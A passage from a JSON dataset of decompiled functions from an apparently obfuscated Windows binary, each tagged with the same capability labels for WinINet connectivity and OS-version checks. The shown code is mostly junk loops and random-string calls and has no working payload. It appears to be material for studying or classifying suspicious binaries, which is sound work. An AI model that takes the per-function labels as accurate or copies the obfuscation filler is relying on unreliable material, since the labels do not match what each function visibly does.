        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00429638(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_78h;\n    uint var_74h;\n    uint var_6ch;\n    uint var_60h;\n    uint var_45h;\n    uint var_29h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"hycrhrtafjatebpxrudstgbjdauqmloxyrusxbqbhpaigqwigihpytwdsvopp\", &var_45h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"hycrhrtafjatebpxrudstgbjdauqmloxyrusxbqbhpaigqwigihpytwdsvopp\", &var_29h);\n    fcn.00483110();\n    fcn.004b21e0(\"hycrhrtafjatebpxrudstgbjdauqmloxyrusxbqbhpaigqwigihpytwdsvopp\", &var_dh);\n    cVar1 = fcn.004c1070(&var_29h + 1, &var_45h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 2; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 412
    },
    "00429780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl\nfcn.00429780(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint noname_6, \n            uint arg_24h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_ach;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_21h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"ygyyfpypsauufnoyluriqhhyztqlxemztparliexaskhdjpzqjssjlrfxsfshgzljhknhfqqfoevzrmvizvgvsevsqyufnqd\", \n                 &var_91h);\n    fcn.00483140();\n    var_18h = 0x393;\n    stack0xffffffdc = *0x523458;\n    for (var_ch = 0x1f; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ygyyfpypsauufnoyluriqhhyztqlxemztparliexaskhdjpzqjssjlrfxsfshgzljhknhfqqfoevzrmvizvgvsevsqyufnqd\", \n                 &var_75h);\n    fcn.00483110();\n    fcn.004b21e0(\"ygyyfpypsauufnoyluriqhhyztqlxemztparliexaskhdjpzqjssjlrfxsfshgzljhknhfqqfoevzrmvizvgvsevsqyufnqd\", \n                 &var_59h);\n    cVar2 = fcn.004c1070(&var_75h + 1, &var_91h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_10h = 0x46; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ygyyfpypsauufnoyluriqhhyztqlxemztparliexaskhdjpzqjssjlrfxsfshgzljhknhfqqfoevzrmvizvgvsevsqyufnqd\", \n                 &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"ygyyfpypsauufnoyluriqhhyztqlxemztparliexaskhdjpzqjssjlrfxsfshgzljhknhfqqfoevzrmvizvgvsevsqyufnqd\", \n                 &var_21h);\n    cVar2 = fcn.004c1070(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x523460;\n    if (cVar2 != '\\0') {\n        for (var_14h = 0x44; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 927
    },
    "00429a0a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00429a0a(void)\n\n{\n    uint var_34h;\n    uint var_19h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x22; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x2c; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    for (var_ch = 0x10; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "00429a6a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl\nfcn.00429a6a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_ach;\n    uint var_94h;\n    uint var_7ch;\n    uint var_64h;\n    uchar var_60h [27];\n    uint var_45h;\n    uint var_29h;\n    uint var_20h;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x523478;\n    var_1ch = 0x652;\n    fcn.00483110();\n    fcn.004b21e0(\"xhwsewyblcmkiokyqxcqwpowciblpuoipgxuyjbvekr\", &var_64h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"vszegpssomkqbsebwzguoguuwwthgunqmskzcjqunezdeddapnzvrldnqmhfqrjfvsemrsbjeljrddpnlqmzrvtulr\", \n                 &var_64h + 1);\n    fcn.00483140();\n    var_20h = 0x1145;\n    fcn.00483110();\n    fcn.004b21e0(\"diyeywksdipxhavkneipbyvvzafaxtkeplloicmivhuzwmfwtjbtsmapfgcnawbxrmwnbmrkyspunydpncjugsdzufctph\", \n                 &var_64h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"veypvxhizhuvkpyqxmyaajplkmdqfpgtnmotjyptscixecqthbqjpxytqryqoaikwvrafxnlplsc\", &var_64h + 3);\n    fcn.00483140();\n    stack0xffffffd4 = *0x523480;\n    fcn.00483110();\n    fcn.004b21e0(\"veypvxhizhuvkpyqxmyaajplkmdqfpgtnmotjyptscixecqthbqjpxytqryqoaikwvrafxnlplsc\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"veypvxhizhuvkpyqxmyaajplkmdqfpgtnmotjyptscixecqthbqjpxytqryqoaikwvrafxnlplsc\", &var_29h);\n    cVar2 = fcn.004c09a0(&var_45h + 1, var_60h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x523488;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x44; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 883
    },
    "00429d22": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00429d22(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_28h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_70h;\n    uint var_6ch;\n    uint var_60h;\n    uint var_45h;\n    uint var_29h;\n    int32_t var_eh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"gcasttrjqklhbjsrhhfmuacvrrkhtxwmayaiyeviprsysdjafhsaikejechrmdjdromapods\", &var_45h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gcasttrjqklhbjsrhhfmuacvrrkhtxwmayaiyeviprsysdjafhsaikejechrmdjdromapods\", &var_29h);\n    fcn.00483110();\n    fcn.004b21e0(\"gcasttrjqklhbjsrhhfmuacvrrkhtxwmayaiyeviprsysdjafhsaikejechrmdjdromapods\", &var_eh);\n    cVar1 = fcn.004c1070(&var_29h + 1, &var_45h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 2; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_eh + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 517
    },
    "00429eca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00429eca(uint noname_0, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e4h;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9bh;\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uchar var_2ah;\n    uchar var_29h;\n    uint var_28h;\n    uint var_21h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"ywbdsrefqpjejlchfylahzrlvrtxlilamnlabnqdtaea\", &var_9bh);\n    fcn.00483140();\n    stack0xffffffdc = *0x523490;\n    var_21h._0_1_ = 0;\n    var_28h = 0x304;\n    fcn.00483110();\n    fcn.004b21e0(\"ydykbqamqisdzijcker\", &var_9bh + 1);\n    fcn.00483140();\n    var_29h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"tmdjfuxwlg\", &var_9bh + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tmdjfuxwlg\", &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(\"tmdjfuxwlg\", &var_61h);\n    cVar1 = fcn.004c1070(&var_7dh + 1, &var_9bh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x49; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x5f; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ydykbqamqisdzijcker\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"ydykbqamqisdzijcker\", &var_2ah);\n    cVar1 = fcn.004c1070(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x3f; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0x112a6;\n}\n",
        "token_count": 836
    },
    "0042a258": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0042a258(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    char cVar1;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_8ch;\n    uint var_80h;\n    uint var_68h;\n    uint var_4eh;\n    uint var_31h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0xbb0;\n    fcn.00483110();\n    fcn.004b21e0(\"wbnixiymnjbqtorgqkxenlzebggglflgqvurfuhtvqjwhrpzuauqsjsrapntlqcjqacfvylturxfhxfthskegno\", &var_4eh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"kavgdiuczkxhnwlklkjlmomobdwufyceawbnegswomou\", &var_4eh + 1);\n    fcn.00483140();\n    var_15h = 0;\n    var_16h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"wbnixiymnjbqtorgqkxenlzebggglflgqvurfuhtvqjwhrpzuauqsjsrapntlqcjqacfvylturxfhxfthskegno\", &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"wbnixiymnjbqtorgqkxenlzebggglflgqvurfuhtvqjwhrpzuauqsjsrapntlqcjqacfvylturxfhxfthskegno\", &var_17h);\n    cVar1 = fcn.004c09a0(&var_31h + 1, &var_4eh + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x3c; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x4b; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 731
    },
    "0042a45a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0042a45a(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_5h;\n    \n    for (stack0xfffffff8 = 0x11; 0 < stack0xfffffff8; unique0x00007a80 = stack0xfffffff8 + -1) {\n    }\n    return 1;\n}\n",
        "token_count": 206
    },
    "0042ae0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042ae0c(void)\n\n{\n    uint var_4ch;\n    uint var_3ch;\n    uint var_21h;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"jzvekwedcttiedqgahqyuwhzvapcesxakeyfpypifjcmadmymeixsxgzpyfeqdwqnhvukumzbhrcrqnfmbolgkspf\", &var_21h);\n    fcn.00483140();\n    var_dh._0_1_ = 1;\n    var_14h = 0x824;\n    var_15h = 1;\n    stack0xffffffdc = *0x523520;\n    for (stack0xfffffff0 = 0x22; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 276
    },
    "0042ae9a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042ae9a(uint arg_8h, uint arg_ch)\n\n{\n    uint var_98h;\n    uint var_94h;\n    uint var_8ch;\n    uint var_7ch;\n    uint var_64h;\n    uint var_4ch;\n    uint var_34h;\n    ulong uStack52;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_15h._0_1_ = 1;\n    uStack36 = *0x523528;\n    var_24h = 0x1f6c;\n    fcn.00483110();\n    fcn.004b21e0(\"erhnoxhvzwqmmznbgryamagxesaxxkjgklgeuraujsmxjopqhgitnuyapvrywmdrpapwflix\", &var_34h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"fajezbhwkxcaatnydx\", &var_34h + 1);\n    fcn.00483140();\n    var_28h = 0x1eeb;\n    fcn.00483110();\n    fcn.004b21e0(\"ipjzyvbasoqdistjxhmjqiuuygnqgeqeaycfypgwhx\", &var_34h + 2);\n    fcn.00483140();\n    uStack52 = *0x523530;\n    var_34h._3_1_ = 0;\n    for (var_ch = 6; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x5a; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (stack0xffffffe8 = 0x1d; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0x5eef;\n}\n",
        "token_count": 559
    },
    "0042b0a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0042b0a6(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_82h;\n    uint var_65h;\n    uint var_49h;\n    uint var_2dh;\n    int32_t var_12h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"buizxtsepmotfotpkgerfdtyegijuisbdtgyosxqootfxoeiguqeupcbghmjmoydqubmbsamowhvlfdpabogjdtrh\", &var_82h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"mmoghtqfpwvyeyndzfdsdsvjovbozzcnulznfjhugeuyiylcq\", &var_82h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"buizxtsepmotfotpkgerfdtyegijuisbdtgyosxqootfxoeiguqeupcbghmjmoydqubmbsamowhvlfdpabogjdtrh\", &var_65h);\n    fcn.00483110();\n    fcn.004b21e0(\"buizxtsepmotfotpkgerfdtyegijuisbdtgyosxqootfxoeiguqeupcbghmjmoydqubmbsamowhvlfdpabogjdtrh\", &var_49h);\n    cVar1 = fcn.004c1070(&var_65h + 1, &var_82h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x21; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"buizxtsepmotfotpkgerfdtyegijuisbdtgyosxqootfxoeiguqeupcbghmjmoydqubmbsamowhvlfdpabogjdtrh\", &var_2dh);\n    fcn.00483110();\n    fcn.004b21e0(\"buizxtsepmotfotpkgerfdtyegijuisbdtgyosxqootfxoeiguqeupcbghmjmoydqubmbsamowhvlfdpabogjdtrh\", &var_12h);\n    cVar1 = fcn.004c1070(&var_2dh + 1, &var_49h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffec = 0x39; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"jfahihr\", &var_12h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 851
    },
    "0042b376": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0042b376(uint param_1)\n\n{\n    char cVar1;\n    uint var_8ch;\n    uint var_7ch;\n    uint var_61h;\n    uint var_45h;\n    uchar var_2bh;\n    uchar var_2ah;\n    uint var_29h;\n    uint var_20h;\n    int32_t var_19h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_19h._0_1_ = 0;\n    var_20h = 0x92;\n    stack0xffffffd4 = *0x523538;\n    var_29h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"wpqomtojnmbcyptkqzlhewqcxbseyakagdnqswgdydkzqehrwzjwxffnsmjurnienbvxc\", &var_61h);\n    fcn.00483140();\n    for (var_ch = 0x4d; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x2d; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"wpqomtojnmbcyptkqzlhewqcxbseyakagdnqswgdydkzqehrwzjwxffnsmjurnienbvxc\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"wpqomtojnmbcyptkqzlhewqcxbseyakagdnqswgdydkzqehrwzjwxffnsmjurnienbvxc\", &var_2bh);\n    cVar1 = fcn.004c09a0(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_14h = 0x52; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    for (stack0xffffffe4 = 99; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"epjyxojdmkzamr\", &var_2ah);\n    fcn.00483140();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 683
    },
    "0042b54e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0042b54e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    uint in_ECX;\n    uint var_40h;\n    uint var_3ch;\n    uchar var_2ah;\n    uchar var_29h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_20h = 0x775;\n    var_24h = 0x1158;\n    var_28h = 0x1e49;\n    var_29h = 1;\n    for (var_ch = 0x17; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x1f; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 10; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    for (var_18h = 0x4d; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    for (var_1ch = 0x1a; 0 < var_1ch; var_1ch = var_1ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"tsgupbapaytrojuq\", &var_2ah);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 439
    },
    "0042b62c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0042b62c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_ECX;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_21h;\n    ulong uStack28;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x523540;\n    stack0xffffffdc = *0x523548;\n    for (var_ch = 0x35; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x56; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x5217f6, &var_21h);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 259
    },
    "0042b6d6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0042b6d6(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_19h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x24; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0xc; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    for (var_ch = 0x49; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x17; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    return 0x17305;\n}\n",
        "token_count": 274
    },
    "0042b758": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0042b758(uint noname_0, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_4ch;\n    uint var_32h;\n    ulong uStack44;\n    uint var_20h;\n    uchar var_19h;\n    uint var_18h;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x806;\n    var_11h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"xmgkwqh\", &var_32h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"jgcdlobgjpqlpbzngrwjxmmzxelgkxchhhbuppzpvcthixkzmcdtcfwvlrogrroqfslqaaayvvnevyoxadyzihb\", &var_32h + 1\n                );\n    fcn.00483140();\n    var_18h = 0x15e4;\n    var_19h = 0;\n    var_20h = 0xd33;\n    uStack44 = *0x523558;\n    stack0xffffffcc = *0x523560;\n    for (var_ch = 0x5f; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0xad5a;\n}\n",
        "token_count": 418
    },
    "0042b86c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0042b86c(uint arg_8h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 100; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return *0x523568;\n}\n",
        "token_count": 100
    },
    "0042ba94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
